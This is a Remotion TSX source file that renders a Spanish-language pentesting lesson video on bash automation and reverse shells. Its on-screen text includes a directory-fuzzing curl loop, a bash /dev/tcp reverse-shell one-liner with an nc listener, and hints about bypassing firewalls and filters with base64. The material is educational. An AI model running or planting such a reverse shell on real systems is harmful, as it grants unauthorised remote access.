// ── video/remotion/compositions/Sl05ReverseShells.tsx ────────────
// Video: pentesting II — automatización y reverse shells.
// Clase 5 de Scripting/Bash (lección bash-05). Guiones: voicebox-scripts/sl-05-*.txt
// Audios reales en public/videos/audio/sl-05-reverse-shells/ (ffprobe 2026-08-26).

import React from 'react';
import { AbsoluteFill, Sequence, staticFile, useVideoConfig } from 'remotion';
import { Audio } from '@remotion/media';
import { sceneStartFrames, AUDIO_TIMINGS, hasAudio } from '../audioTimings';
import { THEME, MONO } from '../theme';
import { FontFace } from '../fonts';
import { RevealLine } from '../primitives/RevealLine';
import { KeyCapsule } from '../primitives/KeyCapsule';
import { TerminalWindow } from '../primitives/TerminalWindow';

const CENTERED: React.CSSProperties = {
  display: 'flex',
  flexDirection: 'column',
  justifyContent: 'center',
  alignItems: 'center',
  height: '100%',
  textAlign: 'center',
};

// ── Escena 1: cerrar el círculo ──────────────────────────────────
const Scene1: React.FC<{ fps: number }> = ({ fps }) => (
  <AbsoluteFill style={CENTERED}>
    <div style={{ fontSize: 30, fontWeight: 800, color: THEME.text, fontFamily: MONO, marginBottom: 22 }}>
      AUTOMATIZACIÓN Y <span style={{ color: THEME.red }}>REVERSE SHELLS</span>
    </div>
    <div style={{ fontSize: 18, color: THEME.muted, fontFamily: MONO, marginBottom: 28 }}>
      de scripts que reconocen, a scripts que atacan
    </div>
    <KeyCapsule label="dos jugadas finales" value="cerrás el círculo" accent={THEME.cyan} delay={Math.round(3 * fps)} size={24} />
    <div style={{ marginTop: 18, fontSize: 16, color: THEME.muted, fontFamily: MONO }}>
      <RevealLine at={7} fps={fps} mark="▸" color={THEME.cyan}>automatizar un ataque con una wordlist</RevealLine>
      <br />
      <RevealLine at={11} fps={fps} mark="▸" color={THEME.cyan}>levantar una reverse shell con bash</RevealLine>
    </div>
  </AbsoluteFill>
);

// ── Escena 2: fuzzing con wordlist ───────────────────────────────
const Scene2: React.FC<{ fps: number }> = ({ fps }) => (
  <AbsoluteFill style={CENTERED}>
    <div style={{ fontSize: 26, fontWeight: 800, color: THEME.text, fontFamily: MONO, marginBottom: 20 }}>
      WORDLIST: <span style={{ color: THEME.green }}>PROBAR CANDIDATO POR CANDIDATO</span>
    </div>
    <TerminalWindow title="kali@attacker-01:~$ nano fuzz.sh" width={940} delay={Math.round(2.5 * fps)}>
      <div style={{ fontSize: 14, whiteSpace: 'pre', lineHeight: 1.7 }}>
        <span style={{ color: THEME.cyan }}>while</span><span style={{ color: THEME.text }}> read dir; </span><span style={{ color: THEME.cyan }}>do</span>
        {'\n'}<span style={{ color: THEME.text }}>  code=$(curl -s -o /dev/null -w "%{'{'}http_code{'}'}" http://10.0.0.11/$dir)</span>
        {'\n'}<span style={{ color: THEME.text }}>  echo "$dir → $code"</span>
        {'\n'}<span style={{ color: THEME.cyan }}>done</span><span style={{ color: THEME.text }}> &lt; wordlist.txt</span>
        {'\n'}<span style={{ color: THEME.amber }}>admin → 200   backup → 200   test → 404</span>
      </div>
    </TerminalWindow>
    <div style={{ display: 'flex', gap: 16, marginTop: 24 }}>
      <KeyCapsule label="200" value="existe" accent={THEME.green} delay={Math.round(11 * fps)} size={20} />
      <KeyCapsule label="404" value="no existe" accent={THEME.red} delay={Math.round(16 * fps)} size={20} />
    </div>
  </AbsoluteFill>
);

// ── Escena 3: reverse shell ──────────────────────────────────────
const Scene3: React.FC<{ fps: number }> = ({ fps }) => (
  <AbsoluteFill style={CENTERED}>
    <div style={{ fontSize: 26, fontWeight: 800, color: THEME.text, fontFamily: MONO, marginBottom: 20 }}>
      REVERSE SHELL: <span style={{ color: THEME.red }}>EL OBJETIVO SE CONECTA HACIA VOS</span>
    </div>
    <TerminalWindow title="kali@attacker-01:~$ nc -lvnp 4444" width={940} delay={Math.round(2.5 * fps)}>
      <div style={{ fontSize: 14, whiteSpace: 'pre', lineHeight: 1.7 }}>
        <span style={{ color: THEME.dim }}># en el objetivo:</span>
        {'\n'}<span style={{ color: THEME.red }}>bash -i &gt;&amp; /dev/tcp/10.0.0.10/4444 0&gt;&amp;1</span>
        {'\n'}<span style={{ color: THEME.dim }}>Listening on 0.0.0.0 4444</span>
        {'\n'}<span style={{ color: THEME.dim }}>Connection received on 10.0.0.11</span>
        {'\n'}<span style={{ color: THEME.green }}>root@target:~#</span>
      </div>
    </TerminalWindow>
    <div style={{ display: 'flex', gap: 16, marginTop: 24 }}>
      <KeyCapsule label="conexión saliente" value="saltea firewalls" accent={THEME.red} delay={Math.round(11 * fps)} size={20} />
      <KeyCapsule label="con filtros" value="la encodás en base64" accent={THEME.amber} delay={Math.round(16 * fps)} size={20} />
    </div>
  </AbsoluteFill>
);

export const Sl05ReverseShells: React.FC = () => {
  const { fps } = useVideoConfig();
  const [s1, s2, s3] = AUDIO_TIMINGS['sl-05-reverse-shells'];
  const starts = sceneStartFrames('sl-05-reverse-shells', fps);
  const dur1 = Math.ceil(s1 * fps);
  const dur2 = Math.ceil(s2 * fps);
  const dur3 = Math.ceil(s3 * fps) + fps;
  const withAudio = hasAudio('sl-05-reverse-shells');

  return (
    <AbsoluteFill style={{ background: THEME.bg, padding: 60, fontFamily: MONO }}>
      <FontFace />
      <Sequence from={starts[0]} durationInFrames={dur1}>
        {withAudio && <Audio src={staticFile('videos/audio/sl-05-reverse-shells/sl-05-scene1.wav')} />}
        <Scene1 fps={fps} />
      </Sequence>
      <Sequence from={starts[1]} durationInFrames={dur2}>
        {withAudio && <Audio src={staticFile('videos/audio/sl-05-reverse-shells/sl-05-scene2.wav')} />}
        <Scene2 fps={fps} />
      </Sequence>
      <Sequence from={starts[2]} durationInFrames={dur3}>
        {withAudio && <Audio src={staticFile('videos/audio/sl-05-reverse-shells/sl-05-scene3.wav')} />}
        <Scene3 fps={fps} />
      </Sequence>
    </AbsoluteFill>
  );
};
